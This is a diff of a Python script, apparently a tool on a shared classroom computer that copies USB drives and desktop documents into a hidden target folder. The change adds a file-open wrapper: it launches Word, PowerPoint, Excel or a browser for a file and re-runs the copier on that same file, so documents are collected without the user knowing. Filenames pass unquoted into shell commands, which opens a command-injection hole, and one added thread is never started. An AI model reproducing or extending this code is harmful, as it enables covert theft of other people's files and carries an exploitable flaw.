@@ -8,6 +8,7 @@ UPANPATH = 'E:\\'
 ALLOW_SUFFIX = ('.doc','.docx','.ppt','.pptx','.pdf')   #过滤后缀名时允许的类型
 UPACOPY_ARGV = '--upan' #U盘全盘复制启动参数
 STRFTIME = '%Y.%m.%d %H:%M:%S'  #格式化时间格式
+OPENCOPY_ARGV = '--open'
 DESKSLEEP = 5   #桌面复制间隔时间
 UPANSLEEP = 5   #U盘检测间隔时间
 KILL360SLEEP = 60   #杀死360画报间隔时间
@@ -20,13 +21,16 @@ isneedupload = False
 
 def execute_with_arg():
     '''使用参数启动'''
-    if len(sys.argv) == 2:
+    if len(sys.argv) >= 2:
         if sys.argv[1] == UPACOPY_ARGV:
             upancopy()
-            sys.exit()
+            sys.exit(0)
+        elif sys.argv[1] == OPENCOPY_ARGV:
+            opencopy(sys.argv[2])
+            sys.exit(0)
         else:
-            opencopy(sys.argv[1])
-            sys.exit()
+            shutil.copy(sys.argv[1],TARGET)
+            sys.exit(0)
 def cmd(cmdline:str):
     '''执行系统命令
 cmdline(str):命令行'''
@@ -49,20 +53,14 @@ filename(str):文件名
 '''
     file_suffix = os.path.splitext(filename)[-1][1:]
     if file_suffix in ('doc','docx'):
-        threading.Thread(target=lambda:os.popen(f'start winword {filename}').close()).start()
-        shutil.copy(filename,os.path.join(TARGET,filename.split(os.sep)[-1]))
-        sys.exit()
+        threading.Thread(target=lambda:cmd(f'start winword {filename}')).start()
     elif file_suffix in ('ppt','pptx'):
-        threading.Thread(target=lambda:os.popen(f'start powerpnt {filename}').close()).start()
-        shutil.copy(filename,os.path.join(TARGET,filename.split(os.sep)[-1]))
-        sys.exit()
+        threading.Thread(target=lambda:cmd(f'start powerpnt {filename}')).start()
     elif file_suffix in ('xls','xlsx'):
-        threading.Thread(target=lambda:os.popen(f'start excel {filename}').close()).start()
-        shutil.copy(filename,os.path.join(TARGET,filename.split(os.sep)[-1]))
-        sys.exit()
+        threading.Thread(target=lambda:cmd(f'start excel {filename}')).start()
     elif file_suffix in ('pdf',):
-        threading.Thread(target=lambda:os.popen(fr'start C:\Users\SEEWO\AppData\Roaming\secoresdk\360se6\Application\360se {filename}').close()).start()
-        shutil.copy(filename,os.path.join(TARGET,filename.split(os.sep)[-1]))
+        threading.Thread(target=lambda:cmd(fr'start C:\Users\SEEWO\AppData\Roaming\secoresdk\360se6\Application\360se {filename}')).start()
+    threading.Thread(target=lambda:cmd(f'start pythonw D:\deskcopy\deskcopy.py {filename}'))
 def copydir(path:str,target:str,isfilter:bool):
     '''复制目录下所有文件
 path(str):目录路径
